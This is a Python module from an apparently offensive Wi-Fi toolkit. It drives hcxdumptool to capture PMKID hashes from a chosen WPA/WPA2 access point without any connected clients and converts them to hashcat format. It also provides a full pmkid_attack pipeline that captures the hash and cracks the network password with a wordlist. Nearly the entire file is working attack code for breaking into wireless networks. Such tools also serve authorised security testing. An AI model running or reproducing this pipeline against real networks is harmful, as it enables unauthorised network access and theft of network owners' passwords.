"""
PMKID Capture (hcxdumptool)
───────────────────────────
Clientless WPA/WPA2 handshake capture via PMKID.

PMKID is found in the first EAPOL message from the AP — no client
needed. This makes it possible to attack WPA networks even when
no clients are connected.

Requires: hcxdumptool + hcxpcapngtool (hcxtools package)
"""

import os
import re
import signal
import subprocess
import tempfile
import time
from typing import Optional, List, Dict
from pathlib import Path

from posframework.config import log
from posframework.tools import is_available, which, run_tool, run_tool_background


class PMKIDCapture:
    """
    Capture PMKID hashes from WPA/WPA2 APs without requiring connected clients.

    The AP includes the PMKID in the first message of the 4-way handshake,
    so we just need to initiate an association — no full handshake needed.

    Usage:
        capture = PMKIDCapture("wlan0mon")
        capture.start(target_bssid="AA:BB:CC:DD:EE:FF", channel=6)
        time.sleep(30)
        results = capture.stop()
        if results:
            print(f"Captured {len(results)} PMKIDs")
            # Convert to hashcat format
            hash_file = capture.convert_to_hashcat()
    """

    def __init__(self, interface: str):
        if not is_available("hcxdumptool"):
            raise FileNotFoundError(
                "hcxdumptool not installed. Install: apt-get install hcxdumptool"
            )
        self.interface = interface
        self._proc: Optional[subprocess.Popen] = None
        self._output_file: Optional[str] = None
        self._filter_file: Optional[str] = None

    @property
    def running(self) -> bool:
        return self._proc is not None and self._proc.poll() is None

    def start(
        self,
        target_bssid: Optional[str] = None,
        channel: Optional[int] = None,
        output_file: Optional[str] = None,
        duration: Optional[int] = None,
        filter_mode: str = "target",
    ) -> bool:
        """
        Start PMKID capture.

        Args:
            target_bssid: Specific AP to target (None = all APs).
            channel: Lock to channel (None = hop).
            output_file: Output .pcapng file path.
            duration: Auto-stop after N seconds (None = run until stop()).
            filter_mode: 'target' (only target), 'all' (everything).

        Returns:
            True if started successfully.
        """
        self.stop()  # Stop any existing capture

        if output_file is None:
            output_file = os.path.join(
                tempfile.gettempdir(),
                f"pmkid_{int(time.time())}.pcapng"
            )
        self._output_file = output_file

        path = which("hcxdumptool")
        if not path:
            return False

        args = [
            path,
            "-i", self.interface,
            "-o", output_file,
            "--active_beacon",
            "--enable_status=15",
        ]

        # Target filtering
        if target_bssid:
            # Create filter file for targeted capture
            self._filter_file = tempfile.mktemp(suffix=".txt")
            # hcxdumptool expects MAC without colons
            clean_mac = target_bssid.replace(":", "").lower()
            with open(self._filter_file, "w") as f:
                f.write(clean_mac + "\n")
            args.extend(["--filterlist_ap", self._filter_file, "--filtermode=2"])

        if channel:
            args.extend(["-c", str(channel)])

        if duration:
            args.extend(["--tot", str(duration)])

        log.info(f"PMKID capture starting: {' '.join(args[1:])}")

        try:
            self._proc = subprocess.Popen(
                args,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            time.sleep(1)
            if self._proc.poll() is not None:
                stderr = self._proc.stderr.read().decode(errors="ignore")
                log.error(f"hcxdumptool failed to start: {stderr}")
                self._proc = None
                return False

            log.info(f"PMKID capture active → {output_file}")
            return True

        except Exception as e:
            log.error(f"hcxdumptool start error: {e}")
            return False

    def stop(self) -> Optional[str]:
        """
        Stop capture and return the output file path.

        Returns:
            Path to .pcapng capture file, or None if nothing captured.
        """
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGTERM)
                self._proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self._proc.kill()
                self._proc.wait(timeout=3)
            except OSError:
                pass
            self._proc = None

        # Clean up filter file
        if self._filter_file and os.path.isfile(self._filter_file):
            os.unlink(self._filter_file)
            self._filter_file = None

        if self._output_file and os.path.isfile(self._output_file):
            size = os.path.getsize(self._output_file)
            if size > 0:
                log.info(f"PMKID capture stopped ({size} bytes)")
                return self._output_file
            else:
                log.info("PMKID capture stopped (no data captured)")
                os.unlink(self._output_file)

        return None

    def convert_to_hashcat(
        self,
        pcapng_file: Optional[str] = None,
        output_file: Optional[str] = None,
    ) -> Optional[str]:
        """
        Convert captured .pcapng to hashcat 22000 format.

        Args:
            pcapng_file: Input file (uses last capture if None).
            output_file: Output .22000 file (auto-generated if None).

        Returns:
            Path to .22000 hash file, or None if conversion failed.
        """
        if not is_available("hcxpcapngtool"):
            log.error("hcxpcapngtool not available — cannot convert")
            return None

        pcapng = pcapng_file or self._output_file
        if not pcapng or not os.path.isfile(pcapng):
            log.error("No capture file to convert")
            return None

        if output_file is None:
            output_file = pcapng.rsplit(".", 1)[0] + ".22000"

        try:
            result = run_tool(
                "hcxpcapngtool",
                ["-o", output_file, pcapng],
                timeout=30,
            )

            if os.path.isfile(output_file) and os.path.getsize(output_file) > 0:
                # Count hashes
                with open(output_file, "r") as f:
                    count = sum(1 for line in f if line.strip())
                log.info(f"Converted {count} PMKID/EAPOL hashes → {output_file}")
                return output_file
            else:
                output = result.stdout + result.stderr
                if "no hashes" in output.lower() or "nothing" in output.lower():
                    log.warning("No PMKID/handshake hashes found in capture")
                else:
                    log.warning(f"hcxpcapngtool produced no output: {output[:200]}")

        except Exception as e:
            log.error(f"hcxpcapngtool conversion failed: {e}")

        return None

    def get_status(self) -> Dict[str, str]:
        """Get current capture status."""
        status = {
            "running": self.running,
            "output_file": self._output_file,
            "file_size": 0,
        }
        if self._output_file and os.path.isfile(self._output_file):
            status["file_size"] = os.path.getsize(self._output_file)
        return status


def pmkid_attack(
    interface: str,
    bssid: str,
    channel: int,
    capture_duration: int = 60,
    wordlist: Optional[str] = None,
) -> Optional[str]:
    """
    Full PMKID attack pipeline: capture → convert → crack.

    Args:
        interface: Monitor mode interface.
        bssid: Target AP BSSID.
        channel: Target channel.
        capture_duration: How long to capture (seconds).
        wordlist: Wordlist for cracking (skips crack if None).

    Returns:
        Cracked password or None.
    """
    # Step 1: Capture PMKID
    capture = PMKIDCapture(interface)
    if not capture.start(target_bssid=bssid, channel=channel):
        return None

    log.info(f"Capturing PMKID for {capture_duration}s...")
    time.sleep(capture_duration)
    pcapng = capture.stop()

    if not pcapng:
        log.warning("No PMKID data captured")
        return None

    # Step 2: Convert to hashcat format
    hash_file = capture.convert_to_hashcat(pcapng)
    if not hash_file:
        log.warning("No valid PMKID hashes extracted")
        return None

    # Step 3: Crack (if wordlist provided)
    if wordlist and is_available("hashcat"):
        from posframework.tools.hashcat import HashcatCracker
        cracker = HashcatCracker()
        password = cracker.crack_wpa(hash_file, wordlist=wordlist)
        if password:
            return password

    elif wordlist and is_available("aircrack-ng"):
        # Fallback to aircrack-ng (needs .cap not .22000)
        log.info("hashcat not available, trying aircrack-ng...")
        from posframework.tools.aircrack import AircrackWPA
        cracker = AircrackWPA()
        # aircrack-ng needs .cap format, not .22000
        # would need conversion back — skip for now
        log.warning("aircrack-ng cannot read .22000 format directly")

    log.info(f"PMKID hash saved: {hash_file} (crack manually with hashcat)")
    return None
